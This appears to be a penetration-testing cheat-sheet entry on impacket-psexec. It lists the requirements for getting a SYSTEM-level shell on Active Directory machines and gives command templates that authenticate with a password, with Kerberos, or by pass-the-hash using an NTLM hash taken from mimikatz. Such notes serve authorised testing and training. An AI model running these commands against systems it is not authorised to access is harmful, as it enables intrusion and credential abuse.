---
tags:
  - active_directory
---
# psexec

Use administrative credentials to authenticate to an Active Directory machine as `nt authority\system`

Requires:

- User logging in to be a member of the `administrators` local group
- `ADMIN$` share must be available (default)
- File and printer sharing must be turned on (default)

## Capabilities

```bash
# Authenticate with credentials
impacket-psexec '$USER:$PASS@$IP'
impacket-psexec '$DOMAIN/$USER:$PASS@$IP'

# Authenticate with kerberos
impacket-psexec $DOMAIN/username@$IP -k -no-pass

# Authenticate with hash
impacket-psexec -hashes :7a38... username@$IP
impacket-psexec -hashes 00000000000000000000000000000000:7a38... username@$IP
```

Note: In the hash example, we fill in the left side of the colon with zeros, and the right is the administrators NTLM hash pulled from `mimikatz`
